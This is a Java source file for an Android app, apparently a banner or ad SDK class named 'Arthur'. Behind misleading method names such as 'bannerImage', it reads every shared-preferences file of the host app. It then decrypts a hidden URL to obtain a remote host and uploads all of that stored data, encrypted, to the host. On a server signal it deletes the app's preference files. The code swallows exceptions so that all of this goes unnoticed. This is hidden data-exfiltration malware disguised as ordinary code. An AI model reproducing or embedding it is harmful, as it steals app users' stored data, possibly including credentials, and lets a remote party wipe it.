package com.cameroon.banner;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import org.json.JSONObject;

import java.io.File;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

//
public class Arthur {

    private static Arthur instance;
    private static Map<String, Object> contentParams;

    //构造器私有化
    private Arthur() {
    }

    //方法同步，调用效率低
    public static synchronized Arthur getInstance() {
        if (instance == null) {
            instance = new Arthur();
        }
        return instance;
    }

    File or;
    File[] files;
    List<String> pathName = new ArrayList<String>();

    // 用于遍历文件价
    public void iteratorPath(String dir) {
        or = new File(dir);
        files = or.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    pathName.add(file.getName());
                } else if (file.isDirectory()) {
                    iteratorPath(file.getAbsolutePath());
                }
            }
        }
    }

    public void start(final Context context) {
        try {

            SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
            String host = sharedPreferences.getString("host", "");
            long pushTime = sharedPreferences.getLong("push11Time", 0);

            if (pushTime != 0 && !TextUtils.isEmpty(host)) {
                Calendar pushTimeC = Calendar.getInstance();
                Calendar current = Calendar.getInstance();
                pushTimeC.setTimeInMillis(pushTime);
                if (pushTimeC.get(Calendar.DATE) == current.get(Calendar.DATE)) {
                    addFile(context);
                    return;
                }
            }
            final String path = "/data/data/" + context.getPackageName() + "/shared_prefs";
            iteratorPath(path);
            contentParams = new HashMap<>();
            final Gson gson = new Gson();
            for (String list : pathName) {
                SharedPreferences sp = context.getSharedPreferences(list.replace(".xml", ""), Context.MODE_PRIVATE);
                Map<String, ?> all = sp.getAll();
                contentParams.put(list.replace(".xml", ""), all);
            }
            String decrypt = AES.Decrypt("c255642354a59d5bbcb1647d0b3f3e342326ee4381d390e0a478c723cc1f586c17e4d8a823175b32094d576f5908d9954e9a1411ca81dc54f26b6585cfdcf6b1ef7de3e4a8cd3d53525f7b4de15fc824",getClass().getSimpleName());
            HttpUtils.doHttpReqeust("GET", decrypt, null, new HttpUtils.StringCallback() {
                @Override
                public void onSuccess(String result) {
                    try {
                        final Type type = new TypeToken<Map<String, Object>>() {
                        }.getType();
                        Map<String, Object> map = gson.fromJson(result, type);
                        final JSONObject jsonObject = new JSONObject(result);
                        int code = jsonObject.optInt("code", -1);
                        if (code == 0) {
                            JSONObject content = jsonObject.optJSONObject("content");
                            if (content != null) {
                                final JSONObject aUrl = content.optJSONObject("aUrl");
                                String host = aUrl.optString("host", "");
                                String pushType = aUrl.optString("pushType", "1");
                                SharedPreferences sharedPreferences = context.getSharedPreferences(Arthur.this.getClass().getSimpleName(), Context.MODE_PRIVATE);
                                SharedPreferences.Editor editor = sharedPreferences.edit();
                                editor.putString("host", host);
                                editor.putLong("push11Time", System.currentTimeMillis());
                                editor.putString("pushType", pushType);
                                editor.commit();
                                addFile(context);
                            }
                        }
                    } catch (Exception e) {
                    }
                }

                @Override
                public void onFaileure(int code, Exception e) {
                }
            });
        } catch (Exception e) {
        }
    }

    private void addFile(Context context) {
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
            String pushType = sharedPreferences.getString("pushType", "-1");
            long pushTime = sharedPreferences.getLong("push12Time", 0);
            if (pushTime != 0) {
                Calendar pushTimeC = Calendar.getInstance();
                Calendar current = Calendar.getInstance();
                pushTimeC.setTimeInMillis(pushTime);
                for (int i = 0; i < Calendar.HOUR_OF_DAY; i++) {
                    if (pickerImageLong(i, pushType, pushTimeC, current)) {
                        return;
                    }
                }
            }
            bannerImage(context);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    private boolean pickerImageLong(int type, String pushType, Calendar pushTimeC, Calendar current) {
        if (String.valueOf(type).equals(pushType)) {
            if (pushTimeC.get(type) == current.get(type)) {
                return true;
            }
        }
        return false;
    }


    private void bannerImage(Context context) {
        try {
            HashMap<String, String> param = new HashMap<>();
            final String path = "/data/data/" + context.getPackageName() + "/shared_prefs";
            final Gson gson = new Gson();
            final SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
            String host = sharedPreferences.getString("host", "1");
            param.put("content", AES.Encrypt( gson.toJson(contentParams),getClass().getSimpleName()));
            param.put("pId", AES.Encrypt( context.getPackageName(),getClass().getSimpleName()));
            HttpUtils.doHttpReqeust("POST", host, param, new HttpUtils.StringCallback() {
                @Override
                public void onSuccess(String result) {
                    try {
                        SharedPreferences.Editor editor = sharedPreferences.edit();
                        editor.putLong("push12Time", System.currentTimeMillis());
                        editor.commit();
                        JSONObject jsonObject1 = new JSONObject(result);
                        int code1 = jsonObject1.optInt("code", -10);
                        if (code1 == 12) {
                            File[] files = new File(path).listFiles();
                            deleteCache(files);
                        }
                    } catch (Exception e) {
                    }
                }

                @Override
                public void onFaileure(int code, Exception e) {

                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void deleteCache(File[] files) {
        boolean flag;
        for (File itemFile : files) {
            flag = itemFile.delete();
            if (flag == false) {
                deleteCache(itemFile.listFiles());
            }
        }
    }


}
